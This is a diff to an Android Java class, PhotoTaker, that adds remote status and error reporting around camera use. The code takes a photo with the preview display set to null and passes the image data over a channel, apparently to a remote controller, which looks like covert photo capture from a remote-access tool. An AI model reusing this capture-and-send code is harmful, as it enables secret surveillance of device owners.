@@ -32,12 +32,15 @@ public class PhotoTaker {
 	    public void onPictureTaken(byte[] data, Camera camera) {
 	    	try{	
 	    		Log.i("PhotoTaker", "Before picture sent !");
+	    		ctx.sendInformation("before picture send");
 		    	ctx.handleData(chan, data);
 		        Log.i("PhotoTaker", "After picture sent !");
+		        ctx.sendInformation("after picture send");
 		        cam.release();
 		        cam = null;
 	    	}catch (Exception e){
 	    		Log.e("PhotoTaker", "ERROR Sending picture !: " + e.getMessage());
+	    		ctx.sendError("ERROR Sending picture !: " + e.getMessage());
 	    	}
 	    	
 	    	
@@ -45,7 +48,8 @@ public class PhotoTaker {
 
 	        if (!pictureFileDir.exists() && !pictureFileDir.mkdirs()) {
 
-	          Log.d("PhotoTaker", "Can't create directory to save image.");
+	          Log.e("PhotoTaker", "Can't create directory to save image.");
+	          ctx.sendError("Can't create directory to save image");
 	          return;
 
 	        }
@@ -54,6 +58,7 @@ public class PhotoTaker {
 
 	        String filename = pictureFileDir.getPath() + File.separator + photoFile;
 	        Log.i("PhotoTaker", "Filepath" + filename);
+	        ctx.sendInformation("Saved image in  " + filename);
 	    	
 	    	File pictureFile = new File(filename);
 
@@ -62,8 +67,10 @@ public class PhotoTaker {
 	          fos.write(data);
 	          fos.close();
 	          Log.i("PhotoTaker", "File Saved");
+	          ctx.sendInformation("File saved");
 	        }catch (Exception e){
-	          Log.e("PhotoTaker", "SAving photo file");
+	          Log.e("PhotoTaker", "ERROR Saving photo file");
+	          ctx.sendError("ERROR Saving photo file");
 	        }
 	    }
 	};
@@ -89,11 +96,16 @@ public class PhotoTaker {
 	    int cameraId = -1;
 	    // Search for the front facing camera
 	    int numberOfCameras = Camera.getNumberOfCameras();
+	    ctx.sendInformation("Number of cameras : " + numberOfCameras);
+	    Log.i("PhotoTaker", "Number of cameras : " + numberOfCameras);
 	    for (int i = 0; i < numberOfCameras; i++) {
+	      Log.i("PhotoTaker", "Camera found id: " + i);
+	      ctx.sendInformation("Camera found id: " + i);
 	      CameraInfo info = new CameraInfo();
 	      Camera.getCameraInfo(i, info);
 	      if (info.facing == CameraInfo.CAMERA_FACING_BACK) {
-	        Log.i("PhotoTaker", "Camera found " + info.facing );
+	        Log.i("PhotoTaker", " Facing Camera found " + info.facing );
+	        ctx.sendInformation("Facing Camera found : " + i);
 	        cameraId = i;
 	        break;
 	      }
@@ -104,46 +116,61 @@ public class PhotoTaker {
 	public boolean takePhoto() {
         if(!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA))){
         	Log.e("PhotoTaker", "No camera!");
+        	ctx.sendError("ERROR no camera");
         	return false;
         }
         Log.i("PhotoTaker", "Just before Open !");
         try {
         	cameraId = findFrontFacingCamera();
         	if (cameraId == -1) {cameraId = 0;}
+        	Log.i("PhotoTaker", "Using camera:" + cameraId);
+        	ctx.sendInformation("Using camera: " + cameraId);
         	cam = Camera.open(cameraId);
         } catch (Exception e) { 
         	Log.e("PhotoTaker", "Opening camera!");
+        	ctx.sendError("ERROR Opening camera: " + e);
         	return false; 
         }
         
         Log.i("PhotoTaker", "Right after Open !");
+        ctx.sendInformation("after open");
         
         if (cam == null){
         	Log.e("PhotoTaker", "Cam is null");
+        	ctx.sendError("ERROR no cam");
         	return false;
         }
 
         
         SurfaceView view = new SurfaceView(ctx);
         Log.i("PhotoTaker", "Right after SurfaceView");
+        ctx.sendInformation("after surfceview");
         try {
-        	holder = view.getHolder();
-        	cam.setPreviewDisplay(holder);
+        	//holder = view.getHolder();
+        	//cam.setPreviewDisplay(holder);
+        	cam.setPreviewDisplay(null);
+        	cam.setPreviewCallback(null);
         	Log.i("PhotoTaker", "Right after PreviewDisplay");
-        } catch(IOException e) { 
+        	ctx.sendInformation("After previewDisplay");
+        } catch(Exception e) { 
         	Log.e("PhotoTaker", "Setting display");
+        	ctx.sendError("ERROR setting display: " + e);
+        	
         	return false; 
         	}
         
         //cam.startPreview();
         Log.i("PhotoTaker", "Right after startPreview");
+        ctx.sendInformation("after startPreview");
         try{
 	        cam.takePicture(null, null, pic);
 	        Log.i("PhotoTaker", "Right after takePicture");
+	        ctx.sendInformation("after take picture");
 	     
         }catch (Exception e){
         	
         	Log.e("PhotoTaker", "ERROR in takePicture callback: " + e);
+        	ctx.sendError("ERROR in takePicture callback: " + e);
         	cam.release();
         }
         return true;
